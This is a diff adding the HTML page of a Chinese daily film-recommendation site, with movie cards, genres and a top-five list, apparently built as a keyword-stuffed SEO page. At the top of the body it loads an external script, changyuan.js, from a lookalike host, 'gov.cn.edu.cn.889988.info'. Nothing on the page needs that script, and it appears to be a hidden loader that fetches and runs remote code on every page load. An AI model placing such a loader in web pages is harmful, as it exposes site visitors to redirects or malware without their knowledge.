@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>365电影网 - 每天一部好电影，全年无休</title>
+    <meta name="description" content="365电影网(365dianyingwang-top)每天为你推荐一部好电影，涵盖喜剧、动作、科幻、爱情等多种类型，让每一天都有好片相伴。">
+    <meta name="keywords" content="365电影网, 365dianyingwang-top, 每日电影推荐, 电影分类, 热门影片, 观影指南">
+    <meta name="author" content="365电影网">
+    <meta name="robots" content="index,follow">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif; }
+        body {
+            background: #f8fafc;
+            color: #334155;
+            line-height: 1.7;
+        }
+        a { text-decoration: none; color: #f59e0b; }
+        a:hover { color: #d97706; }
+        .wrap { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        /* 顶部 */
+        header {
+            background: #ffffff;
+            border-bottom: 1px solid #e2e8f0;
+            position: sticky; top: 0; z-index: 999;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .topbar { display: flex; align-items: center; justify-content: space-between; height: 64px; }
+        .brand { font-size: 22px; font-weight: 800; color: #1e293b; }
+        .brand span { color: #f59e0b; }
+        nav ul { display: flex; gap: 6px; list-style: none; }
+        nav ul li a {
+            font-size: 15px; font-weight: 600; color: #64748b;
+            padding: 8px 16px; border-radius: 8px; transition: .2s;
+        }
+        nav ul li a:hover { background: #fef3c7; color: #f59e0b; }
+
+        /* Hero */
+        .hero {
+            background: linear-gradient(135deg, #f59e0b 0%, #fbbf24 50%, #fcd34d 100%);
+            padding: 80px 0 70px; text-align: center; position: relative; overflow: hidden;
+        }
+        .hero::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
+            animation: pulse 8s ease-in-out infinite;
+        }
+        @keyframes pulse { 0%,100%{ transform: scale(1); } 50%{ transform: scale(1.05); } }
+        .hero-inner { position: relative; z-index: 1; max-width: 700px; margin: 0 auto; }
+        .hero-badge {
+            display: inline-block; background: rgba(255,255,255,0.25); color: #fff;
+            font-size: 13px; font-weight: 700; padding: 6px 16px; border-radius: 20px;
+            margin-bottom: 20px; backdrop-filter: blur(10px);
+        }
+        .hero h1 {
+            font-size: 42px; font-weight: 900; color: #fff; line-height: 1.2; margin-bottom: 16px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .hero h1 em { font-style: normal; color: #fef3c7; }
+        .hero p { font-size: 18px; color: rgba(255,255,255,0.9); margin-bottom: 30px; }
+        .hero-url {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: #fff; color: #f59e0b; font-weight: 800; padding: 14px 32px;
+            border-radius: 12px; transition: .3s; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .hero-url:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.15); color: #f59e0b; }
+
+        /* 栏目 */
+        section { padding: 60px 0; }
+        .head { text-align: center; margin-bottom: 40px; }
+        .head .icon { font-size: 36px; display: block; margin-bottom: 8px; }
+        .head h2 { font-size: 28px; font-weight: 800; color: #1e293b; }
+        .head .sub { font-size: 15px; color: #94a3b8; margin-top: 6px; }
+
+        /* 每日推荐卡片 */
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; }
+        .card {
+            background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
+            padding: 24px; transition: .3s; position: relative; overflow: hidden;
+        }
+        .card:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(245,158,11,0.15); border-color: #fbbf24; }
+        .card .day {
+            position: absolute; top: 16px; right: 16px;
+            width: 36px; height: 36px; border-radius: 10px;
+            background: linear-gradient(135deg, #f59e0b, #fbbf24);
+            color: #fff; font-weight: 800; font-size: 14px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .card .icon-big { font-size: 40px; display: block; margin-bottom: 14px; margin-top: 8px; }
+        .card .tag {
+            font-size: 12px; font-weight: 700; color: #f59e0b;
+            background: #fef3c7; padding: 4px 10px; border-radius: 6px; display: inline-block; margin-bottom: 10px;
+        }
+        .card h3 { font-size: 17px; color: #1e293b; margin-bottom: 8px; font-weight: 800; }
+        .card p { font-size: 14px; color: #64748b; }
+
+        /* 分类标签 */
+        .cats { display: flex; flex-wrap: wrap; gap: 12px; justify-content: center; margin-bottom: 40px; }
+        .cat {
+            background: #fff; border: 2px solid #e2e8f0; border-radius: 10px;
+            padding: 10px 20px; font-weight: 700; color: #475569; font-size: 14px; transition: .2s;
+        }
+        .cat:hover { border-color: #f59e0b; color: #f59e0b; background: #fef3c7; }
+
+        /* 排行 */
+        .rank { max-width: 800px; margin: 0 auto; }
+        .r-item {
+            display: flex; align-items: center; gap: 20px;
+            background: #fff; border: 1px solid #e2e8f0; border-radius: 14px;
+            padding: 18px 22px; margin-bottom: 14px; transition: .3s;
+        }
+        .r-item:hover { box-shadow: 0 6px 16px rgba(245,158,11,0.1); border-color: #fbbf24; }
+        .r-num {
+            width: 44px; height: 44px; border-radius: 12px; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 900; color: #fff; font-size: 18px;
+            background: linear-gradient(135deg, #f59e0b, #fbbf24);
+        }
+        .r-item h3 { font-size: 17px; color: #1e293b; font-weight: 800; }
+        .r-item p { font-size: 14px; color: #64748b; }
+
+        /* 关于 */
+        .about {
+            max-width: 800px; margin: 0 auto; text-align: center;
+            background: #fff; border: 1px solid #e2e8f0; border-radius: 20px; padding: 44px;
+        }
+        .about .big-icon { font-size: 48px; display: block; margin-bottom: 16px; }
+        .about h3 { font-size: 22px; color: #1e293b; margin-bottom: 14px; font-weight: 800; }
+        .about p { color: #64748b; font-size: 15px; margin-bottom: 12px; }
+        .about .site-name { font-size: 20px; font-weight: 900; color: #f59e0b; margin: 20px 0 8px; }
+        .about .site-url {
+            display: inline-block; background: #fef3c7; border: 2px solid #fbbf24;
+            color: #f59e0b; font-weight: 800; padding: 12px 24px; border-radius: 12px;
+        }
+
+        footer {
+            background: #1e293b; color: #94a3b8; text-align: center;
+            padding: 28px 0; font-size: 14px;
+        }
+        footer a { color: #fbbf24; }
+
+        @media (max-width: 900px) { .grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 600px) {
+            .topbar { flex-direction: column; height: auto; gap: 10px; padding: 14px 0; }
+            nav ul { flex-wrap: wrap; justify-content: center; gap: 4px; }
+            nav ul li a { font-size: 14px; padding: 6px 12px; }
+            .hero { padding: 50px 0 50px; }
+            .hero h1 { font-size: 28px; }
+            .grid { grid-template-columns: 1fr; }
+            .r-item { flex-direction: column; text-align: center; }
+            .about { padding: 28px 18px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+    <div class="wrap topbar">
+        <div class="brand">365<span>电影网</span></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#daily">每日推荐</a></li>
+                <li><a href="#types">电影分类</a></li>
+                <li><a href="#top">热门排行</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section id="home" class="hero">
+    <div class="wrap hero-inner">
+        <div class="hero-badge">🎬 每天一部好电影</div>
+        <h1>365电影网 · <em>全年无休</em>的观影指南</h1>
+        <p>每天为你精选一部好片，让每一天都有好电影相伴。从周一到周日，从一月到十二月。</p>
+        <a class="hero-url" href="https://365dianyingwang-top">🔗 https://365dianyingwang-top</a>
+    </div>
+</section>
+
+<section id="daily">
+    <div class="wrap">
+        <div class="head">
+            <span class="icon">📅</span>
+            <h2>每日推荐</h2>
+            <div class="sub">编辑每天精选一部值得观看的影片</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <div class="day">1</div>
+                <span class="icon-big">🎭</span>
+                <div class="tag">周一轻松</div>
+                <h3>布达佩斯大饭店</h3>
+                <p>韦斯·安德森的对称美学，色彩斑斓的轻松喜剧。</p>
+            </div>
+            <div class="card">
+                <div class="day">2</div>
+                <span class="icon-big">🚀</span>
+                <div class="tag">周二科幻</div>
+                <h3>星际穿越</h3>
+                <p>诺兰神作，爱与时间的终极探索。</p>
+            </div>
+            <div class="card">
+                <div class="day">3</div>
+                <span class="icon-big">❤️</span>
+                <div class="tag">周三浪漫</div>
+                <h3>恋恋笔记本</h3>
+                <p>雨中拥吻，一生挚爱，经典爱情片。</p>
+            </div>
+            <div class="card">
+                <div class="day">4</div>
+                <span class="icon-big">🕵️</span>
+                <div class="tag">周四悬疑</div>
+                <h3>七宗罪</h3>
+                <p>黑暗犯罪经典，大卫·芬奇的巅峰之作。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="types" style="background: #fef3c7;">
+    <div class="wrap">
+        <div class="head">
+            <span class="icon">🎯</span>
+            <h2>电影分类</h2>
+            <div class="sub">按类型快速找到你喜欢的电影</div>
+        </div>
+        <div class="cats">
+            <div class="cat">😂 喜剧片</div>
+            <div class="cat">💥 动作片</div>
+            <div class="cat">👻 恐怖片</div>
+            <div class="cat">🌌 科幻片</div>
+            <div class="cat">❤️ 爱情片</div>
+            <div class="cat">📜 历史片</div>
+            <div class="cat">🎨 动画片</div>
+            <div class="cat">🎵 音乐片</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <span class="icon-big">😂</span>
+                <h3>喜剧片</h3>
+                <p>轻松幽默，适合放松心情，缓解压力。</p>
+            </div>
+            <div class="card">
+                <span class="icon-big">💥</span>
+                <h3>动作片</h3>
+                <p>紧张刺激，大场面大制作，肾上腺素飙升。</p>
+            </div>
+            <div class="card">
+                <span class="icon-big">🌌</span>
+                <h3>科幻片</h3>
+                <p>脑洞大开，探索未知，感受未来世界。</p>
+            </div>
+            <div class="card">
+                <span class="icon-big">❤️</span>
+                <h3>爱情片</h3>
+                <p>甜蜜浪漫，感人至深，体验爱情的美好。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="top">
+    <div class="wrap">
+        <div class="head">
+            <span class="icon">🏆</span>
+            <h2>热门排行</h2>
+            <div class="sub">365天里被观看最多的经典影片</div>
+        </div>
+        <div class="rank">
+            <div class="r-item">
+                <div class="r-num">1</div>
+                <div><h3>肖申克的救赎</h3><p>希望让人自由，影史排名第一的经典之作。</p></div>
+            </div>
+            <div class="r-item">
+                <div class="r-num">2</div>
+                <div><h3>阿甘正传</h3><p>生活就像一盒巧克力，你永远不知道下一颗是什么味道。</p></div>
+            </div>
+            <div class="r-item">
+                <div class="r-num">3</div>
+                <div><h3>泰坦尼克号</h3><p>永不沉没的爱情故事，经典中的经典。</p></div>
+            </div>
+            <div class="r-item">
+                <div class="r-num">4</div>
+                <div><h3>盗梦空间</h3><p>梦境与现实的交错，烧脑神作。</p></div>
+            </div>
+            <div class="r-item">
+                <div class="r-num">5</div>
+                <div><h3>楚门的世界</h3><p>如果生活是一场真人秀，你敢走出那扇门吗？</p></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about" style="background: #fef3c7;">
+    <div class="wrap">
+        <div class="head">
+            <span class="icon">💬</span>
+            <h2>关于我们</h2>
+        </div>
+        <div class="about">
+            <span class="big-icon">🎬</span>
+            <h3>关于 365电影网</h3>
+            <p><b>365电影网</b> 是一个专注于每日电影推荐的平台。我们每天为你精选一部好电影，涵盖各种类型和风格，让每一天都有好片相伴。</p>
+            <p>我们只做影片介绍、分类推荐和影评摘要，不提供盗版播放，不转载未授权资源。</p>
+            <div class="site-name">网站名称：365电影网</div>
+            <div class="site-url">https://365dianyingwang-top</div>
+            <p style="margin-top:18px;font-size:13px;color:#94a3b8;">关键词：365电影网、365dianyingwang-top、每日电影推荐、电影分类、热门影片</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        © 2024 365电影网 · https://365dianyingwang-top ｜ 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
